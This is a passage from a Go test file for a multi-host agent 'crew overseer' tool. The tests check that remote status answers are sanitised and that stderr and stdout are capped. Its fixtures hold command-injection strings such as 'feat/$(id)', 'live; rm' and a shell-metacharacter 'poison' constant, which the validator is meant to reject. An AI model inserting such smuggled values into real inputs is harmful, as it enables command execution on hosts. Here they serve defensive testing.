	good := repo["crews"].([]any)[0].(map[string]any)
	good["workers"] = []any{
		map[string]any{"branch": "feat/$(id)", "state": "working"},
		map[string]any{"branch": "feat/y", "from": "worker:x;y", "state": "working"},
		map[string]any{"branch": "feat/n", "name": "n m`", "state": "working"},
	}
	crewWith := func(id string, edit func(c, d map[string]any)) map[string]any {
		d := map[string]any{"state": "dead", "pid": nil, "pane": nil, "lane": nil, "last_event_s": nil, "home": nil}
		c := map[string]any{"crew_id": id, "attention": "idle", "workers": []any{}, "holds": []any{}, "overseer_inbox": []any{}, "dispatcher": d}
		edit(c, d)
		return c
	}
	repo["crews"] = []any{good,
		crewWith(evil, func(_, _ map[string]any) {}),
		crewWith("c2", func(_, d map[string]any) { d["state"] = "live; rm" }),
		crewWith("c3", func(_, d map[string]any) { d["lane"] = "alive$(x)" }),
		crewWith("c4", func(c, _ map[string]any) { c["attention"] = "x y" }),
		crewWith("c5", func(_, d map[string]any) { d["lane"] = "stale" }),
	}
	status["queue"] = map[string]any{
		"head": map[string]any{"repo": "a/b", "crew_id": "c9", "id": "h 1;x", "waited_s": 5},
		"demoted": []any{
			map[string]any{"repo": "a/b", "crew_id": evil, "id": "1700000000000-1", "first_due": 1, "demoted_at": 2},
			map[string]any{"repo": "a/b", "crew_id": "c9", "id": "1700000000000-2", "first_due": 1, "demoted_at": 2},
		},
		"parked": []any{
			map[string]any{"repo": "r(", "crew_id": "c9", "id": "1700000000000-3", "reason": "demoted"},
			map[string]any{"repo": "a/b", "crew_id": "c9", "id": "i`d", "reason": "demoted"},
			map[string]any{"repo": "a/b", "crew_id": "c9", "id": "1700000000000-4", "reason": "x y"},
			map[string]any{"repo": "a/b", "crew_id": "c9", "id": "1700000000000-5", "reason": "demoted"},
		},
	}
	a["inbox"] = append(a["inbox"].([]any), map[string]any{"repo": "a/b$(id)", "common": "/x y$(z)", "cursor": ago(10),
		"events": []any{farEvent(ago(28), "c9", "dispatcher:c9", "overseer:halo", "{}")}})
	a["misrouted"] = []any{
		map[string]any{"repo": "a/b", "common": "/x/y", "crew_id": evil, "from": "worker:a", "ts": ago(40)},
		map[string]any{"repo": "a/b", "common": "/x/y", "crew_id": "c9", "from": "worker:$(id)", "ts": ago(41)},
		map[string]any{"repo": "a/b$(id)", "common": "/x/y", "crew_id": "c9", "from": "worker:a", "ts": ago(42)},
		map[string]any{"repo": "a/b", "common": "/x/y", "crew_id": "c9", "from": "worker:a", "ts": ago(43)},
	}

	ans, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
	if err != nil {
		t.Fatal(err)
	}
	if len(ans.Status.Repos) != 1 {
		t.Fatalf("repos = %+v, want the repo with an invalid label and common dir dropped", ans.Status.Repos)
	}
	var ids []string
	for _, c := range ans.Status.Repos[0].Crews {
		ids = append(ids, c.CrewID)
	}
	if !slices.Equal(ids, []string{"c9", "c5"}) {
		t.Errorf("crews = %q, want only c9 and c5: an invalid id, state, lane or attention drops the crew", ids)
	}
	if w := ans.Status.Repos[0].Crews[0].Workers; len(w) != 1 || w[0]["branch"] != "feat/n" || w[0]["name"] != nil {
		t.Errorf("c9 workers = %v, want only feat/n, its name dropped: an invalid branch or sender drops the row", w)
	}
	if n := len(ans.Status.Skipped); n != 5 {
		t.Errorf("skipped = %+v, want the 4 dropped crews and the dropped repo", ans.Status.Skipped)
	}
	if len(ans.Inbox) != 1 || len(ans.Inbox[0].Events) != 1 || ans.Inbox[0].Events[0]["crew_id"] != "c9" {
		t.Errorf("inbox = %+v, want only c9's reply in the valid batch", ans.Inbox)
	}
	if len(ans.Misrouted) != 1 || ans.Misrouted[0].TS != ago(43) {
		t.Errorf("misrouted = %+v, want only the valid one: an invalid crew id, sender or repo drops it", ans.Misrouted)
	}
	q := ans.Status.Queue
	if q.Head != nil || len(q.Demoted) != 1 || q.Demoted[0].ID != "1700000000000-2" || len(q.Parked) != 1 || q.Parked[0].ID != "1700000000000-5" {
		t.Errorf("queue = %+v, want the head, the evil demotion and the invalid parked entries dropped", q)
	}
	for _, part := range []any{ans.Status.Repos, ans.Status.Queue, ans.Misrouted, ans.Inbox} {
		raw := marshal(t, part)
		if i := bytes.IndexAny(raw, shellish); i >= 0 {
			t.Errorf("%q survived admission in %s", raw[i], raw)
		}
	}
}

func TestFederateSinceIsTheOldestRepoCursor(t *testing.T) {
	far := farFix(t, "mbp")
	write := func(t *testing.T, path string, ts int64) {
		t.Helper()
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, fmt.Appendf(nil, "%d\n", ts), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	for _, tc := range []struct {
		name  string
		seed  int64
		repos map[string]int64
		since int64
	}{
		{name: "no cursor", since: nowMS() - 24*3600*1000},
		{name: "the seed alone", seed: ago(500), since: ago(500)},
		{name: "the oldest repo cursor", seed: ago(900), repos: map[string]int64{"/git/a/.git": ago(300), "/git/b/.git": ago(200)}, since: ago(300)},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newStatusFix(t)
			f.overseer("halo", "mbp")
			if tc.seed != 0 {
				write(t, filepath.Join(f.hostDir("mbp"), "seed"), tc.seed)
			}
			for common, ts := range tc.repos {
				write(t, lane.OverseerHostCursor(f.env["XDG_STATE_HOME"], "mbp", common), ts)
			}
			var calls fedCalls
			f.opts.Federate = calls.serve(t, far)
			f.collect(StatusRequest{})
			want := []string{fmt.Sprintf("mbp: crew overseer status --origin halo --since %d", tc.since)}
			if got := calls.list(); !slices.Equal(got, want) {
				t.Errorf("calls = %q, want %q", got, want)
			}
		})
	}
}

func TestServeFarNamesEachBusCommon(t *testing.T) {
	far := farFix(t, "mbp",
		wmsg(200, "c9", "dispatcher:c9", "overseer:halo", `{"kind":"note"}`),
		wmsg(100, "c9", "worker:feat/z#s1-1", "overseer:halo", `{"kind":"ack"}`),
	)
	ans, err := ServeFar(t.Context(), "halo", ago(250), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(ans.Inbox) != 1 || ans.Inbox[0].Common != far.common {
		t.Errorf("inbox = %+v, want common %s", ans.Inbox, far.common)
	}
	if len(ans.Misrouted) != 1 || ans.Misrouted[0].Common != far.common {
		t.Errorf("misrouted = %+v, want common %s", ans.Misrouted, far.common)
	}
}

func TestFederateDemotesGuestsWithNoReachableHome(t *testing.T) {
	far := farFix(t, "mbp",
		wstatus(100, "f1", "far/1", "working", ""),
		wstatus(100, "f2", "far/2", "working", ""),
	)
	far.windows("far/1", "far/2")
	far.tmux.Out[stampFormat] = "f1\x1fhalo\nf2\x1fzed\n"
	f := newStatusFix(t,
		wstatus(100, "g1", "loc/1", "working", ""),
		wstatus(100, "g2", "loc/2", "working", ""),
		wstatus(100, "g3", "loc/3", "working", ""),
	)
	f.windows("loc/1", "loc/2", "loc/3")
	f.tmux.Out[stampFormat] = "g1\x1fmbp\ng2\x1fzed\ng3\x1fqux\n"
	f.overseer("halo", "mbp", "zed")
	var calls fedCalls
	serve := calls.serve(t, far)
	f.opts.Federate = func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
		if host == "zed" {
			_, _ = io.WriteString(stderr, "ssh: zed: refused\n")
			return 255
		}
		return serve(ctx, host, argv, stdout, stderr)
	}
	doc := f.collect(StatusRequest{})
	for _, tc := range []struct {
		c          CrewStatus
		attn, home string
	}{
		{doc.crew(t, "g1"), "guest", "mbp"},
		{doc.crew(t, "g2"), "unattended", "zed"},
		{doc.crew(t, "g3"), "unattended", "qux"},
		{doc.Hosts[0].Repos[0].Crews[0], "guest", "halo"},
		{doc.Hosts[0].Repos[0].Crews[1], "unattended", "zed"},
	} {
		if tc.c.Attention != tc.attn || tc.c.Dispatcher.Home == nil || *tc.c.Dispatcher.Home != tc.home {
			t.Errorf("%s = %s home %v, want %s with home %s kept", tc.c.CrewID, tc.c.Attention, tc.c.Dispatcher.Home, tc.attn, tc.home)
		}
	}
}

func TestFederateUnreadableHostsListsKnownPartners(t *testing.T) {
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	f.opts.Sender.Hosts = func() (map[string]remote.Host, error) { return nil, errors.New("settings.json: \x1b[31mbad\x7f") }
	if err := WriteOK(f.hostDir("mbp"), ago(3600)); err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{f.hostDir("zed"), f.hostDir("halo"), f.hostDir("-bad")} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	var calls fedCalls
	f.opts.Federate = func(_ context.Context, host string, argv []string, _, _ io.Writer) int {
		calls.add(host, argv)
		return 0
	}
	doc := f.collect(StatusRequest{})
	if got := calls.list(); len(got) != 0 {
		t.Errorf("unreadable hosts federated: %q", got)
	}
	if len(doc.Hosts) != 2 || doc.Hosts[0].Host != "mbp" || doc.Hosts[1].Host != "zed" {
		t.Fatalf("hosts = %+v, want mbp and zed from their state dirs", doc.Hosts)
	}
	want := "settings hosts cannot be read (settings.json: [31mbad)"
	for _, h := range doc.Hosts {
		if h.State != "unprobed" || h.Error == nil || *h.Error != want {
			t.Errorf("%s = %s error %v, want unprobed with %q", h.Host, h.State, h.Error, want)
		}
	}
	if h := doc.Hosts[0]; h.LastOkTS == nil || *h.LastOkTS != ago(3600) || h.AgeS == nil || *h.AgeS != 3600 {
		t.Errorf("mbp last_ok_ts/age_s = %v/%v, want %d/3600", h.LastOkTS, h.AgeS, ago(3600))
	}
	if h := doc.Hosts[1]; h.LastOkTS != nil || h.AgeS != nil {
		t.Errorf("zed last_ok_ts/age_s = %v/%v, want null", h.LastOkTS, h.AgeS)
	}
}

// megStderr writes 1 MiB to stderr after a first line, and reports how much of
// it the writer it was handed holds.
func megStderr(held *int, rc int) roster.Capture {
	return func(_ context.Context, _ string, _ []string, _, stderr io.Writer) int {
		_, _ = io.WriteString(stderr, "far: refused\n")
		chunk := bytes.Repeat([]byte("x"), 64<<10)
		for range 16 {
			_, _ = stderr.Write(chunk)
		}
		if s, ok := stderr.(interface{ String() string }); ok {
			*held = len(s.String())
		}
		return rc
	}
}

func TestFederateFarStderrIsCapped(t *testing.T) {
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	held := -1
	f.opts.Federate = megStderr(&held, 1)
	h := f.collect(StatusRequest{}).Hosts[0]
	if held < 0 || held > stderrMax {
		t.Errorf("the far stderr held %d bytes, want at most %d", held, stderrMax)
	}
	if h.Error == nil || *h.Error != "far: refused" {
		t.Errorf("error = %v, want the first line", h.Error)
	}
}

func TestOverseerProbeStderrIsCapped(t *testing.T) {
	m := &probeMemo{timeout: time.Second, failed: map[string]string{}}
	held := -1
	var stderr bytes.Buffer
	rc := m.wrap(megStderr(&held, 1), "c1")(t.Context(), "h1", []string{"crew", "roster", "--live", "--", "c1"}, io.Discard, &stderr)
	if rc != 1 || held < 0 || held > stderrMax {
		t.Errorf("rc = %d, the probe stderr held %d bytes, want at most %d", rc, held, stderrMax)
	}
	if stderr.String() != "far: refused\n" {
		t.Errorf("stderr = %q, want the first line", stderr.String())
	}
}

func TestOverseerProbeMemoizesOnlyTransportFailures(t *testing.T) {
	m := &probeMemo{timeout: time.Second, failed: map[string]string{}}
	argv := func(crew string) []string { return []string{"crew", "roster", "--live", "--", crew} }
	var calls []string
	capture := func(rc int, line string) roster.Capture {
		return func(_ context.Context, host string, argv []string, stdout, stderr io.Writer) int {
			calls = append(calls, host+" "+argv[len(argv)-1])
			_, _ = io.WriteString(stdout, "[]")
			_, _ = io.WriteString(stderr, line+"\n")
			return rc
		}
	}
	if rc := m.wrap(capture(2, "alpha is not a clone of acme/alpha"), "c1")(t.Context(), "h1", argv("c1"), io.Discard, io.Discard); rc != 2 {
		t.Errorf("alpha rc = %d", rc)
	}
	if rc := m.wrap(capture(0, ""), "c2")(t.Context(), "h1", argv("c2"), io.Discard, io.Discard); rc != 0 {
		t.Errorf("beta rc = %d, want its own probe's answer", rc)
	}
	if rc := m.wrap(capture(255, "ssh: h2: refused"), "c3")(t.Context(), "h2", argv("c3"), io.Discard, io.Discard); rc != 255 {
		t.Errorf("h2 rc = %d", rc)
	}
	var stderr bytes.Buffer
	if rc := m.wrap(capture(0, ""), "c4")(t.Context(), "h2", argv("c4"), io.Discard, &stderr); rc == 0 || stderr.String() != "ssh: h2: refused\n" {
		t.Errorf("after ssh's 255: rc = %d stderr %q, want a fast failure", rc, stderr.String())
	}
	if want := []string{"h1 c1", "h1 c2", "h2 c3"}; !slices.Equal(calls, want) {
		t.Errorf("calls = %q, want %q", calls, want)
	}
}

// poison is what each far string becomes in TestAdmitHostPoisonEveryLeaf:
// shell, glob and line-breaking characters around the letters x, i and d, so
// a rewrite that strips them leaves "xid".
const poison = "x;$(id)`|&<>'\"*? \n"

// farTextPaths are the only far strings admission copies as text.
var farTextPaths = []string{"status.skipped[].status", "inbox[].events[].body"}

var farIdentRE = regexp.MustCompile(`^[A-Za-z0-9:/#._@-]*$`)

// keyedPaths are the far objects whose keys are data, not field names.
var keyedPaths = []string{"status.machine.engines"}

// norm is a concrete leaf path as its type names it: a list index is [], a
// key of a keyed object {}.
func norm(path string) string {
	out := ""
	for seg := range strings.SplitSeq(path, ".") {
		switch {
		case seg != "" && strings.Trim(seg, "0123456789") == "":
			out += "[]"
		case slices.Contains(keyedPaths, out):
			out += "{}"
		case out == "":
			out = seg
		default:
			out += "." + seg
		}
	}
	return out
}

// typeLeaves adds the path of every string field t holds, by json tag, to out;
// with have, only those v carries. A row typed map[string]any is poisoned
// value by value instead, and a far status's hosts are never read.
func typeLeaves(t reflect.Type, v any, have bool, path string, out map[string]bool) {
	switch t.Kind() {
	case reflect.Pointer:
		typeLeaves(t.Elem(), v, have, path, out)
	case reflect.String:
		if _, ok := v.(string); ok || !have {
			out[path] = true
		}
	case reflect.Interface:
		// Any value at all: whatever strings it holds, the fixture must carry it.
		if v != nil || !have {
			out[path] = true
		}
	case reflect.Invalid, reflect.Bool, reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64,
		reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr,
		reflect.Float32, reflect.Float64, reflect.Complex64, reflect.Complex128, reflect.Chan, reflect.Func, reflect.UnsafePointer:
	case reflect.Slice, reflect.Array:
		list, _ := v.([]any)
		if !have {
			list = []any{nil}
		}
		for _, e := range list {
			typeLeaves(t.Elem(), e, have, path+"[]", out)
		}
	case reflect.Map:
		if t.Elem().Kind() == reflect.Interface {
			return
		}
		m, _ := v.(map[string]any)
		if !have {
			m = map[string]any{"": nil}
		}
		for _, e := range m {
			out[path+"{key}"] = true
			typeLeaves(t.Elem(), e, have, path+"{}", out)
		}
	case reflect.Struct:
		m, _ := v.(map[string]any)
		for f := range t.Fields() {
			name, _, _ := strings.Cut(f.Tag.Get("json"), ",")
			p := strings.TrimPrefix(path+"."+name, ".")
			if name == "" || name == "-" || p == "status.hosts" {
				continue
			}
			if e, ok := m[name]; ok || !have {
				typeLeaves(f.Type, e, have, p, out)
			}
		}
	}
}

// walkStrings visits every string of a decoded JSON value, and every key of a
// keyed object as path#key, in a stable order, with a setter for it.
func walkStrings(v any, path string, visit func(path, s string, set func(string))) {
	join := func(seg string) string { return strings.TrimPrefix(path+"."+seg, ".") }
	switch x := v.(type) {
	case map[string]any:
		keyed := slices.Contains(keyedPaths, norm(path))
		for _, k := range slices.Sorted(maps.Keys(x)) {
			p := join(k)
			if keyed {
				visit(p+"#key", k, func(n string) { x[n] = x[k]; delete(x, k) })
			}
			if s, ok := x[k].(string); ok {
				visit(p, s, func(n string) { x[k] = n })
				continue
			}
			walkStrings(x[k], p, visit)
		}
	case []any:
		for i, e := range x {
			p := join(strconv.Itoa(i))
			if s, ok := e.(string); ok {
				visit(p, s, func(n string) { x[i] = n })
				continue
			}
			walkStrings(e, p, visit)
		}
	}
}

func decoded(t *testing.T, v any) map[string]any {
	t.Helper()
	var out map[string]any
	if err := decodeNumbers(marshal(t, v), &out); err != nil {
		t.Fatal(err)
	}
	return out
}

// maximalFar is a far answer from mbp for halo built by ServeFar, carrying
// every string a FarAnswer can: a live dispatcher with a pid file, a pane and
// a lane, quota and fleet holds (head, demoted, parked), a working, a blocked
// and a remote-host worker, a guest crew, engines with a hot window, a
// skipped repo, an inbox reply and a misrouted msg. A lead, and an unknown key
// on each worker and event, are added to the encoded answer.
func maximalFar(t *testing.T) map[string]any {
	t.Helper()
	hold := func(agoS int64, crew, id string, weight int) string {
		return fleetAddRow(ago(agoS), crew, id, "feat/"+id, "normal", weight)
	}
	far := farFix(t, "mbp",
		hold(900, "c1", "1700000000001-1", 2),
		hold(800, "c1", "1700000000002-1", 1),
		hold(700, "c1", "1700000000003-1", 9),
		wmsg(600, "c1", "dispatcher:c1", "hold:c1",
			fmt.Sprintf(`"{\"id\":\"1700000000004-1\",\"wait\":{\"engine\":\"claude\",\"window\":\"five_hour\",\"resets_at\":%d},\"task\":{}}"`, nowS+3600)),
		wstatus(500, "c1", "feat/w", "working", ""),
		wstatus(400, "c1", "feat/b", "blocked", `,"detail":"waiting (cycle 2 of 24)"`),
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"h3","remote":true}`, ago(300)),
		wstatus(300, "c2", "g/1", "working", ""),
		wmsg(200, "c1", "dispatcher:c1", "overseer:halo", `"{\"kind\":\"ack\",\"re\":7}"`),
		wmsg(100, "c1", "worker:feat/w#s1-1", "overseer:halo", `"hi"`),
	)
	far.pidfile("c1", "100")
	far.crewFile("c1", "pane", "%81\n")
	far.crewFile("c1", "stream.lock.d/pid", "100\n")
	far.crewFile("c1", "stream.tick", fmt.Sprintf(`{"pid":100,"ts":%d,"park":300}`, ago(10)))
	far.windows("feat/w", "feat/b", "g/1")
	far.tmux.Out[stampFormat] = "c2\x1fhalo\n"
	gone := filepath.Join(far.root, "gone", ".git")
	if err := os.WriteFile(far.opts.Registry, []byte(far.common+"\n"+gone+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	record := filepath.Join(far.env["XDG_STATE_HOME"], "crew", "fleet-due.json")
	if err := os.MkdirAll(filepath.Dir(record), 0o755); err != nil {
		t.Fatal(err)
	}
	rec := marshal(t, dueDoc(map[holdKey]dueEntry{{far.common, "c1", "1700000000002-1"}: {Demoted: ago(300)}}))
	if err := os.WriteFile(record, rec, 0o644); err != nil {
		t.Fatal(err)
	}
	cache := fmt.Sprintf(`{"fetched_epoch":%d,"engines":{"claude":{"windows":{"5h":{"used_pct":99,"resets_at":%d}},"limit_reached":null}}}`, nowS-60, nowS+100)
	if err := os.WriteFile(far.opts.BudgetFile, []byte(cache), 0o644); err != nil {
		t.Fatal(err)
	}
	ans, err := ServeFar(t.Context(), "halo", ago(1000), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	a := decoded(t, ans)
	status := a["status"].(map[string]any)
	status["machine"].(map[string]any)["leads"] = []any{
		map[string]any{"repo": "alpha", "branch": "feat/w", "name": "remy", "tier": "standard", "weight": 2},
	}
	for _, r := range status["repos"].([]any) {
		for _, c := range r.(map[string]any)["crews"].([]any) {
			for _, w := range c.(map[string]any)["workers"].([]any) {
				w.(map[string]any)["zz_extra"] = "kept nowhere"
			}
		}
	}
	for _, b := range a["inbox"].([]any) {
		for _, e := range b.(map[string]any)["events"].([]any) {
			e.(map[string]any)["zz_extra"] = "kept nowhere"
		}
	}
	return a
}

// projectedWorkerKeys are the keys a far worker row may keep.
var projectedWorkerKeys = []string{
	"age_s", "blocked", "branch", "detail", "finished_window", "from", "host", "live",
	"name", "pr_candidate", "pr_url", "remote_unprobed", "source", "stale", "state", "ts",
}

func TestAdmitHostPoisonEveryLeaf(t *testing.T) {
	fixture := maximalFar(t)
	want, have := map[string]bool{}, map[string]bool{}
	typeLeaves(reflect.TypeFor[FarAnswer](), nil, false, "", want)
	typeLeaves(reflect.TypeFor[FarAnswer](), fixture, true, "", have)
	for _, p := range slices.Sorted(maps.Keys(want)) {
		if !have[p] {
			t.Errorf("the fixture carries no %s: a far string with no poison case", p)
		}
	}

	admit := func(t *testing.T, a map[string]any) map[string]any {
		t.Helper()
		ans, err := AdmitHost(marshal(t, a), "mbp", "halo", ago(1000))
		if err != nil {
			t.Fatal(err)
		}
		return decoded(t, ans)
	}
	// leaves are an admitted answer's non-empty strings and object keys, by
	// path; every one but far text holds to the identifier charset.
	leaves := func(t *testing.T, out map[string]any) map[string]string {
		t.Helper()
		got := map[string]string{}
		var walk func(v any, path string)
		walk = func(v any, path string) {
			switch x := v.(type) {
			case map[string]any:
				for k, e := range x {
					if !farIdentRE.MatchString(k) {
						t.Errorf("key %q at %s", k, path)
					}
					p := strings.TrimPrefix(path+"."+k, ".")
					got[p+"#key"] = k
					walk(e, p)
				}
			case []any:
				for i, e := range x {
					walk(e, strings.TrimPrefix(path+"."+strconv.Itoa(i), "."))
				}
			case string:
				if slices.Contains(farTextPaths, norm(path)) {
					got[path] = x
					return
				}
				if !farIdentRE.MatchString(x) || strings.Contains(x, "xid") {
					t.Errorf("%s = %q", path, x)
				}
				if x != "" {
					got[path] = x
				}
			}
		}
		walk(out, "")
		return got
	}

	clean := admit(t, fixture)
	kept := leaves(t, clean)
	var ans FarAnswer
	if err := decodeNumbers(marshal(t, clean), &ans); err != nil {
		t.Fatal(err)
	}
	s := ans.Status
	if len(s.Repos) != 1 || len(s.Repos[0].Crews) != 2 || len(s.Skipped) != 1 || s.Machine == nil || len(s.Machine.Leads) != 1 ||
		s.Queue.Head == nil || len(s.Queue.Demoted) != 1 || len(s.Queue.Parked) != 1 || len(ans.Inbox) != 1 || len(ans.Misrouted) != 1 {
		t.Fatalf("a clean answer lost an element: %+v", ans)
	}
	c1 := s.Repos[0].Crews[0]
	if d := c1.Dispatcher; d.PID != nil || d.Pane != nil || d.Lane == nil || len(c1.Holds) != 4 || len(c1.Workers) != 3 || len(c1.OverseerInbox) != 1 {
		t.Errorf("clean c1 = %+v, want pid and pane dropped, the rest kept", c1)
	}
	for _, w := range slices.Concat(c1.Workers, s.Repos[0].Crews[1].Workers) {
		for k := range w {
			if !slices.Contains(projectedWorkerKeys, k) {
				t.Errorf("worker %v kept %s", w["branch"], k)
			}
		}
	}
	for _, e := range ans.Inbox[0].Events {
		if _, ok := e["zz_extra"]; ok {
			t.Errorf("event kept an unknown key: %v", e)
		}
	}

	n := 0
	walkStrings(fixture, "", func(string, string, func(string)) { n++ })
	for i := range n {
		a := decoded(t, fixture)
		var path string
		j := 0
		walkStrings(a, "", func(p, _ string, set func(string)) {
			if j == i {
				path = p
				set(poison)
			}
			j++
		})
		t.Run(path, func(t *testing.T) {
			got := leaves(t, admit(t, a))
			np := norm(strings.TrimSuffix(path, "#key"))
			switch {
			case slices.Contains(farTextPaths, np), kept[path] == "":
			case np == "status.repos[].host":
				if got[path] != "mbp" {
					t.Errorf("repo host = %q, want the settings key", got[path])
				}
			case len(got) >= len(kept):
				t.Errorf("a poisoned %s left %d strings of %d: its element was rewritten, not dropped", path, len(got), len(kept))
			}
		})
	}
}

// A far roster row an overseer's --host probe returns keeps only the fields
// a lane line or the protocol reads, each valid, or is dropped.
func TestOverseerProbeRowsProjected(t *testing.T) {
	f := newStatusFix(t,
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"h1","remote":true}`, ago(60)),
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/2","name":"rex","host":"h1","remote":true}`, ago(60)),
	)
	f.overseer("halo")
	f.opts.OverseerProbe = func(string) roster.Capture {
		return func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
			_, _ = io.WriteString(stdout, `[{"branch":"r/1","from":"worker:$(id)","state":"working","live":true,"age_s":5,"zz_extra":"x"},`+
				`{"branch":"r/2","from":"worker:r/2#s1-1","name":"rex","state":"working","live":true,"age_s":5,"title":"t;x","zz_extra":"x"}]`)
			return 0
		}
	}
	doc := f.collect(StatusRequest{})
	rows := doc.crew(t, "c1").Workers
	if len(rows) != 1 || rows[0]["branch"] != "r/2" {
		t.Fatalf("rows = %v, want only r/2: r/1's from is no worker id", rows)
	}
	for k := range rows[0] {
		if !slices.Contains(projectedWorkerKeys, k) {
			t.Errorf("row kept %s: %v", k, rows[0])
		}
	}
	if w := rows[0]; w["host"] != "h1" || w["from"] != "worker:r/2#s1-1" || w["state"] != "working" || w["remote_unprobed"] != false {
		t.Errorf("row = %v", w)
	}
}

// An overseer probe's stdout is capped as a pull's is: over the cap is a
// failure of that probe alone, never remembered for the host.
func TestOverseerProbeStdoutIsCapped(t *testing.T) {
	m := &probeMemo{timeout: time.Second, failed: map[string]string{}}
	argv := []string{"crew", "roster", "--live", "--", "c1"}
	calls, held := 0, 0
	big := func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
		calls++
		chunk := bytes.Repeat([]byte(" "), 1<<20)
		for range 5 {
			n, _ := stdout.Write(chunk)
			held += n
		}
		return 0
	}
	var stdout, stderr bytes.Buffer
	if rc := m.wrap(big, "c1")(t.Context(), "h1", argv, &stdout, &stderr); rc != 1 || stderr.String() != overSize+"\n" || stdout.Len() != 0 {
		t.Errorf("rc = %d stderr = %q stdout %d bytes, want 1, %q and nothing", rc, stderr.String(), stdout.Len(), overSize)
	}
	if held > farMaxBytes {
		t.Errorf("the probe's stdout held %d bytes, want at most %d", held, farMaxBytes)
	}
	held = 0
	if rc := m.wrap(big, "c1")(t.Context(), "h1", argv, io.Discard, io.Discard); rc != 1 || calls != 2 {
		t.Errorf("rc = %d after %d calls, want the host asked again", rc, calls)
	}
}
